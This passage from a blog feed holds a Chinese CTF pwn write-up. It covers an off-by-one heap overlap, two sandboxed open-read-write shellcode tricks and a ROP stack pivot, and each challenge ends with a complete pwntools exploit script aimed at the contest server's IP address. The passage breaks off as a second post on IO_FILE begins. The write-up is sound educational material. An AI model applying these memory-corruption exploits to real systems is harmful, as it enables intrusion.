    <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="Pwn-warmup-1"><a href="#Pwn-warmup-1" class="headerlink" title="Pwn warmup 1"></a>Pwn warmup 1</h2><p>保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;/glibc/glibc-2.31/build/lib&#x27;</span><br></pre></td></tr></table></figure><p>附件有给源代码,粗读一遍判定为菜单类堆题</p><p>程序开头会直接给出flag的地址</p><p>考虑如何利用,细读源码发现edit函数存在off-by-one漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">note_t</span> *note = get_note();</span><br><span class="line">  <span class="keyword">if</span> (!note) &#123; <span class="built_in">puts</span>(<span class="string">&quot;Not found&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">strlen</span>(note-&gt;content);  </span><br><span class="line">  printff(<span class="string">&quot;New content: &quot;</span>);</span><br><span class="line">  read_str(note-&gt;content, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strlen函数到\x00结束,如果某个chunk能占用下一个chunk的prev_size则能覆盖下一个chunk的size</p><p>可以用这个漏洞来达到chunk extended and overlapping的目的</p><p>再看add函数,进行add函数时</p><ol><li>首先创建一个chunk用于一个该note信息管理</li><li>再创建一个用户自定义大小的chunk用于存储内容</li></ol><p>这两个chunk是黏在一起的</p><p>于是,我们可以这样利用</p><p>创建3个note</p><ol><li>note0用于触发off-by-one</li><li>note1用于释放重分配以达到chunk extended and overlapping</li><li>note2用于触发show功能读取flag</li></ol><p>具体步骤</p><p>我创建的三个note的content大小都为24且初始填满(1和2填不填无所谓),方便利用</p><ol><li>edit修改note0,使note1的size为一个能够覆盖到note2的content指针的大小</li><li>释放note1</li><li>再add一个note,content大小为能使分配到的chunk为之前释放的note1的content,并填充内容覆盖note2的content指针</li><li>对note2进行show,得到flag</li></ol><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第2个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x61&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;80&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>+p64(e))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>以上是我第一次做的思路,这样做的话对note1的content大小没有什么要求</p><p>后面我发现其实只要两个note也能实现得到flag</p><p>不过对note1的content大小有严格要求</p><p>因为如果note1的content实际chunk大小为0x20的话</p><p>再分配note1的时候,note1头的chunk因为大小合适,直接取的之前被释放的note1的content的chunk</p><p>又因为之前的chunk overlapping</p><p>所以note1的content就包含了note1的头,可以直接修改note1的content指针</p><p>再show-note1得到flag</p><p>顺便尝试了下函数写法</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(size))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">add(<span class="number">48</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(e))</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 实操调试的一些小细节 </summary>              <div class='content'>              <p>主要还是一些关于stdin的细节，当程序读取n个字节时，可以发送多余n的字节，程序读取完后，剩余的数据依然会被保留在stdin中，相邻的输入函数又会直接读取其中的数据，而这可能并不是我们所期望的，这样如果<strong>没有注意把控字节数</strong>的话，调试的时候可能出一些问题，例如菜单式题目直接从stdin中读取一个数据，读到了非菜单区号数据,那么程序的运行就会受阻;又或者程序读取的数据,并没有包含整个我们需要的数据,又会出现问题</p><p>总之需要注意发送的数据与接收的数据数量对应关系,特别要注意\n符</p>              </div>            </details><h2 id="shellcode1"><a href="#shellcode1" class="headerlink" title="shellcode1"></a>shellcode1</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/aichch/pwn/s1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida打开,程序执行并不复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fwrite(<span class="string">&quot;Input your shellcode:\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x16</span>uLL, _bss_start);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)buf) &lt;= <span class="number">5</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sandbox();</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  fwrite(<span class="string">&quot;Oops! maybe too long!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x16</span>uLL, _bss_start);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过再payload前添加’\x00’绕过strlen的检测,但单独一个<strong>‘\x00’会使得程序流停滞</strong>,故可以让’\x00’和push联合作为一条指令—-push 0h(\x6a00)</p><p>另外程序开启了沙盒,只能使用orw操作</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./s1&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">2225</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)  <span class="comment">#不进行这一步会出错,因为默认是32位</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sh=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">sh+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">sh+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">sh=asm(sh)</span><br><span class="line">p.send(<span class="string">b&#x27;\x6a\x00&#x27;</span>+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另外提一下,程序进行时stdin,stdout,stderr三个文件流是自行打开的,文件描述符分别是0,1,2</p><p>故之后打开的文件的描述符是从3开始的</p><h2 id="shellcode2"><a href="#shellcode2" class="headerlink" title="shellcode2"></a>shellcode2</h2><p>这题没做出来,汇编忘得差不多了,还是太依赖ida的反汇编了😥</p><p>赛后看大佬的wp才恍然大悟</p><hr><p>这题在于程序一次只能执行四个字节长度的代码,故如果要连接各串代码还需要用到jmp指令,又占去了一半的长度,</p><p>再加上程序还会随机打乱代码顺序</p><p>想直接完成orw几乎不可能</p><p>但可以观察到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000016DA 48 8B 45 F0                   mov     rax, [rbp+var_10]</span><br><span class="line">.text:00000000000016DE 48 83 C0 10                   add     rax, 10h</span><br><span class="line">.text:00000000000016E2 48 89 C2                      mov     rdx, rax</span><br><span class="line">.text:00000000000016E5 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000016EA FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>程序是通过rdx跳往代码执行处的</p><p>那么第一次只需要向rdx处写命令,并在前面填充一些nop,程序流继续往下执行就会执行新写的命令了</p><p>那么第一次执行的代码因该就要是read(0,rdx,rdx),长度不用指定只要够大就行</p><p>因为syscall要在最后执行,所以只有四分之一的成功率</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sc2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.12.48.154&quot;</span>, <span class="number">2226</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">next_slot = <span class="string">&#x27;;jmp $+30&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_slot</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">return</span> code + next_slot</span><br><span class="line"></span><br><span class="line">preamble = []</span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;xor edi, edi&#x27;</span>))  <span class="comment">#不能是rdi,汇编代码三个字节</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;xor eax, eax&#x27;</span>)) <span class="comment">#同上</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;push rdx;pop rsi&#x27;</span>)) <span class="comment">#mov rsi,rdx是三个字节长度</span></span><br><span class="line">preamble.append(gen_slot(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    movabs rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mov rax, 0x2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, rax     </span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;want?\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.send(asm(preamble[i]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x100</span> + asm(sc))</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;Fire!\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure><p>因为open函数执行后,文件描述符存储在rax,所以直接rax赋值给rdi就行了</p><h2 id="Play-with-rop"><a href="#Play-with-rop" class="headerlink" title="Play-with-rop"></a>Play-with-rop</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>存在溢出但只能控制rbp和rip,故需要先进行栈迁移</p><p>第一次通过再调用一次main中的read往迁移后的rbp-0x30写来进一步获得栈迁移的能力</p><p>之后栈迁移后利用puts函数将broken_keys打印出来,在跳转到wonderland获得加密后的flag</p><p>这题不算很难,但做的时候栈迁移的位置不好,被printf的栈越界卡住了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./chall&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;1.12.48.154&quot;</span>, <span class="number">2224</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_rsi_rdx = <span class="number">0x4012A9</span></span><br><span class="line"></span><br><span class="line">key0_addr = <span class="number">0x4040B0</span></span><br><span class="line">key1_addr = key0_addr + <span class="number">0x8</span></span><br><span class="line">key2_addr = key1_addr + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">lea_ret = <span class="number">0x04016B4</span></span><br><span class="line">read_again = <span class="number">0x401686</span>   <span class="comment">#这个read是往rbp-0x30写</span></span><br><span class="line">wonderland = <span class="number">0x4012D6</span></span><br><span class="line"></span><br><span class="line">fake_rbp = <span class="number">0x404600</span> + <span class="number">0x880</span> <span class="comment"># +0x880 to ensure fake stack is large enough for puts</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(fake_rbp) + p64(read_again)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;leave your name&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi_rsi_rdx) + p64(<span class="number">0</span>) + p64(fake_rbp-<span class="number">0x30</span>) + p64(<span class="number">0x100</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(fake_rbp-<span class="number">0x38</span>) + p64(lea_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_rsi_rdx) + p64(key0_addr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(puts) + p64(pop_rdi_rsi_rdx) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(wonderland)</span><br><span class="line">p.send(payload3)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;flag:&#x27;</span>)</span><br><span class="line">keys = data[<span class="number">77</span>:<span class="number">77</span>+<span class="number">24</span>] <span class="comment"># 77是通过计算字符数得到的,不晓得为什么先接收77个字节再改动keys不能成功</span></span><br><span class="line">k0 = u64(keys[:<span class="number">8</span>])</span><br><span class="line">k1 = u64(keys[<span class="number">8</span>:<span class="number">16</span>]) ^ k0</span><br><span class="line">k2 = u64(keys[<span class="number">16</span>:<span class="number">24</span>]) ^ k1</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(k0), <span class="built_in">hex</span>(k1), <span class="built_in">hex</span>(k2))</span><br><span class="line"></span><br><span class="line">flag = p.recv().strip()</span><br><span class="line">real_flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">real_flag += (u64(flag[:<span class="number">8</span>])    ^ k0).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">8</span>:<span class="number">16</span>])  ^ k1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">16</span>:<span class="number">24</span>]) ^ k2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">24</span>:<span class="number">32</span>]) ^ k0).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">32</span>:<span class="number">40</span>]) ^ k1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">real_flag += (u64(flag[<span class="number">40</span>:<span class="number">48</span>]) ^ k2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(real_flag)</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><details class="folding-tag" blue><summary> 0x1不要过于依赖反汇编 </summary>              <div class='content'>              <p>很多细节其实是藏在汇编代码中的,如果过于依赖反汇编就很难发现这部分细节</p>              </div>            </details><details class="folding-tag" blue><summary> 0x2用pwntools汇编注意设置环境 </summary>              <div class='content'>              <p>pwntools,asm功能默认是在i386下,如果不设置环境的可能会出大错</p>              </div>            </details><details class="folding-tag" blue><summary> 0x3出现过的库函数皆可使用 </summary>              <div class='content'>              <p>只要函数被调用过,并布置好参数,所有的库函数都可以被使用,太久没做栈迁移,竟然忘记用可以用read部署了……….</p>              </div>            </details><details class="folding-tag" blue><summary> 0x4栈迁移的地址选择 </summary>              <div class='content'>              <p>printf和puts等函数调用时使用的栈空间较大,栈迁移后如果迁移位置不合适,很可能会造成内存越界,访问不可写的内存空间,从而产生段错误,故迁移位置一定要足够合适,一般至少要留0x880的可写空间</p>              </div>            </details>]]></content>
    
    
    <summary type="html">记录一下</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE</title>
    <link href="https://ixout.github.io/posts/23411/"/>
    <id>https://ixout.github.io/posts/23411/</id>
    <published>2023-04-07T14:43:07.000Z</published>
    <updated>2023-04-15T07:07:25.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>先看IO_FILE结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td 